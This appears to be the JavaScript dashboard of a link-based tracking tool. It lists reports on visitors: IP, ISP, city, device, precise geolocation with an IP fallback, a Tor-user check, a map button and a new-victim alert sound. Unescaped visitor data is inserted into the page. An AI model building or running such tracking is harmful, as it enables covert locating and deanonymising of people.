// Specify the sound file's URL
let notificationSound = new Audio('lib/audio/notification.wav');


async function init() {
    let init_result = (await eel.Initialize()());
    // Set url
    document.getElementById('serving_url').value = init_result['url'];
    // Load reports
    for (let i = 0; init_result['reports'].length > i; i++) {
        let report = init_result['reports'][i];
        tableWrite(report['uuid'], report['data'], report['text']);
    }
}

// View report data
async function tableView(id) { 
    let data = (await eel.ReadTable(id)());
    UIkit.modal.alert(data); 
}

// Remove report from tables
function tableDelete(id) { 
    eel.DeleteTable(id)();
    document.getElementById(id).remove();
}

// Open google maps with specified coordinates
function geolocate(latitude, longitude) {
    let url = "https://www.google.com/maps?q=" + latitude + "," + longitude;
    window.open(url, "_blank");
}

const BROWSER_ICONS = Object.entries({
    chrome: 'logos:chrome',
    chromium: 'openmoji:chromium',
    firefox: 'logos:firefox',
    edge: 'logos:microsoft-edge',
    safari: 'logos:safari',
    opera: 'logos:opera',
    vivaldi: 'logos:vivaldi-icon',
    ie: 'devicon:ie10',
    yandex: 'vscode-icons:file-type-yandex',
});

const OS_ICONS = Object.entries({
    windows: 'devicon:windows8',
    linux: 'logos:linux-tux',
    ubuntu: 'logos:ubuntu',
    debian: 'logos:debian',
    redhat: 'logos:redhat-icon',
    fedora: 'logos:fedora',
    freebsd: 'logos:freebsd',
    android: 'devicon:android',
    ios: 'ps:apple',
    osx: 'ps:apple',
});

function getBrowserIcon(browserName, data) {
    // Check if tor browser is being used
    if (browserName.includes('firefox') && data['Devices'].length == 0 && data['RAM'] === 'Unknown' && data['Battery'] === 'Unknown' && data['Render'] === 'Unknown') {
        return 'logos:tor-browser';
    }
    // Default check
    for (const [key, value] of BROWSER_ICONS) {
        if (browserName.includes(key)) {
            return value;
        }
    }
    return 'emojione:question-mark'
}

function getDeviceIcon(deviceName) {
    for (const [key, value] of OS_ICONS) {
        if (deviceName.includes(key)) {
            return value;
        }
    }
    return 'emojione:question-mark'
}

// Write report into table
eel.expose(tableWrite);
function tableWrite(id, data, isNew=false) {
    let table = document.getElementById('table-data');
    // Parse geolocation
    let geolocation = data['Geolocation'];
    if ('Message' in geolocation && geolocation['Message'].includes('denied')) {
        latitude = data['IPInfo']['Latitude'];
        longitude = data['IPInfo']['Longitude'];
    } else {
        latitude = data['Geolocation']['Latitude'];
        longitude = data['Geolocation']['Longitude'];
    }
    // Parse Browser and OS
    let device = platform.parse(data['UserAgent']);
    let browserIcon = `<iconify-icon icon="${getBrowserIcon(device.name.toLowerCase(), data)}" width="28px" height="28px"></iconify-icon>`;
    let deviceIcon = `<iconify-icon icon="${getDeviceIcon(device.os.family.toLowerCase().replaceAll(' ', ''))}" width="28px" height="28px"></iconify-icon>`;
    let device_info = `<div uk-tooltip="title: ${device.description}; pos: bottom-left"> ${browserIcon} <iconify-icon icon="fluent:divider-tall-16-regular" height="28px"></iconify-icon> ${deviceIcon}</div>`
    content = `
    <tr id="${id}">
        <td>${device_info}</td>
        <td>${data['IPInfo']['IP']} / ${data['IPInfo']['ISP']}</td>
        <td><iconify-icon icon="circle-flags:${data['IPInfo']['CountryCode'].toLowerCase()}" width="28px" height="28px"></iconify-icon> ${data['IPInfo']['Country']} / ${data['IPInfo']['City']}</td>
        <td>${data['CurrentTimestamp']}</td>
        <td>
            <button class="uk-button uk-button-small uk-button-primary" onclick="tableView('${id}')">
                <iconify-icon icon="carbon:view" width="16px" height="16px"></iconify-icon>
            </button>
            <button class="uk-button uk-button-small uk-button-primary uk-button-purple" onclick="geolocate(${latitude}, ${longitude})">
                <iconify-icon icon="gis:satellite" width="16px" height="16px"></iconify-icon>
            </button>
            <button class="uk-button uk-button-small uk-button-danger" onclick="tableDelete('${id}');">
                <iconify-icon icon="ph:trash" width="16px" height="16px"></iconify-icon>
            </button>
        </td>
    </tr>
    `;
    table.insertAdjacentHTML("afterbegin", content);
    // Notify
    if (isNew) {
        notificationSound.play();
    }
}

window.addEventListener('load', (e) => {
    init();
});
